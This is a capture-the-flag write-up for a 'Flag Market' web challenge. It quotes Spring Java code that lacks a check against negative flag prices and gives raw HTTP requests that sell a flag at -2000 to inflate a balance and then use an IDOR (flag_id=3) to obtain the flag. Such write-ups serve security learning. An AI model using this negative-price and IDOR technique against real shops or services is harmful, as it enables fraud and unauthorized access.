# Flag Market

The goal of the challenge was to buy a flag. However, our balance starts from 0.

We could see that when selling the flag, the relevant code does not validate that the flag price is positive.

```java
@PostMapping("/sell")
public String sellFlag(@Valid Flag flag, BindingResult bindingResult, Model model, Principal principal) {
    Flag flagExists = flagService.findByName(flag.getName());
    if (flagExists != null) {
        bindingResult.rejectValue("name", "error.user",
                "There is already a flag with the name provided");
    }
    if (principal != null) {
        User user = userService.findByUsername(principal.getName());
        model.addAttribute("current_user", user);
        flag.setSeller(user);
        flagService.saveFlag(flag);
    }
    return "redirect:flag/" + flag.getSlug();
}
```

Thereafter, the flag is saved into the database.

```java
@Override
public void saveFlag(Flag flag) {
    flag.setSlug(UUID.randomUUID().toString());
    flag.setPinned(false);
    flag.setHidden(true);
    flagRepository.save(flag);
}
```

We could thus sell a flag with a negative price. In the `buyFlag` function, this negative price is subtracted from `buyerBalance`, increasing the buyer's total balance.

```java
@Override
public Boolean buyFlag(Flag flag, User buyer) {
    if (buyer.getPurchasedFlagsCount() >= 2) {
        return false;
    }
    if(buyer.getBalance() > flag.getPrice()) {
        Integer buyerBalance = buyer.getBalance();
        User seller = flag.getSeller();
        Integer sellerBalance = seller.getBalance();
        buyer.setBalance(buyerBalance - flag.getPrice());
        seller.setBalance(sellerBalance + flag.getPrice());
        userService.updateUser(seller);
        userService.updateUser(buyer);
        userService.increasePurchasedFlagCountById(buyer.getId());
        return true;
    } else {
        return false;
    }
}
```

1\) Sell a flag with a negative price

```http
POST /sell HTTP/1.1
Host: flag-market.yactf.ru
Cookie: JSESSIONID=C711887D4DC8C674B65CEE65EE3E630D
Content-Length: 93
Origin: https://flag-market.yactf.ru
Content-Type: application/x-www-form-urlencoded
Connection: close

_csrf=...&price=-2000
```

2\) Buy the flag from a second account

3\) Perform a simple IDOR to get the flag with `flag_id=3`

```http
POST /buy HTTP/1.1
Host: flag-market.yactf.ru
Cookie: JSESSIONID=C748582E79B81447C43554243CCDC403
Content-Length: 52
Origin: https://flag-market.yactf.ru
Content-Type: application/x-www-form-urlencoded
Connection: close

_csrf=4ea95070-85b4-4f65-86f6-7c384cd5dbad&flag_id=3
```
